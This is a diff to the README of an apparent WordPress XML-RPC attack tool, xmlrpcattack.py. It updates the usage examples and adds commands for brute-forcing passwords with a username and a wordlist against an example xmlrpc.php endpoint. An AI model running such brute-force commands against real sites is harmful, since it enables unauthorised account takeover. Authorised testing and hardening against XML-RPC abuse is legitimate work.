@@ -55,11 +55,19 @@ options:
 Example :
 List Supported Method
   ```
-  python xmlrpcattack.py --url https://example.com/xmlrpc.php -l
+  ./xmlrpcattack.py --url https://example.com/xmlrpc.php -l
   ```
 `demo.sayHello` method :
   ```
-  python xmlrpcattack.py --url https://example.com/xmlrpc.php -m demo.sayHello
+  ./xmlrpcattack.py --url https://example.com/xmlrpc.php -m demo.sayHello
+  ```
+`brute-force attack`:
+  ```
+  ./xmlrpcattack.py --url https://example.com/xmlrpc.php -U username -P wordlist.txt
+  ```
+  or
+  ```
+  ./xmlrpcattack.py --url https://example.com/xmlrpc.php --user username --password wordlist.txt
   ```
 
 > [!IMPORTANT]\
